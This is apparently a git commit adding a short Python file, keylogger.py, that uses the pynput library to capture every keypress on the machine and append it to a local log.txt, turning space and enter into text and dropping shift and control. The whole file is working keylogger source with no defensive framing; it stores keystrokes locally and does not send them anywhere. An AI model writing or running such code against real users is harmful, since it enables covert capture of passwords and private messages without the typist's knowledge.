e6c921e90e30461465276c5598ed8618a71c5918
Twincypatel <104062892+Twincypatel@users.noreply.github.com>
2024-07-31 14:03:39 +0530

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,29 @@
+from pynput.mouse import Controller
+from pynput.keyboard import Controller
+
+from pynput.keyboard import Listener
+
+def write_to_file(key):
+    letter = str(key)
+    letter = letter.replace("'","")
+
+    if letter == "Key.space":
+        letter = " "
+
+    if letter == "Key.shift":
+        letter = ""
+
+    if letter == "Key.shift_r":
+        letter = ""
+    
+    if letter == "Key.ctrl_l":
+        letter = ""
+    
+    if letter == "Key.enter":
+        letter = "\n"
+    
+    with open("log.txt", "a")  as f:
+        f.write(letter)
+
+with Listener(on_press=write_to_file) as l:
+    l.join()
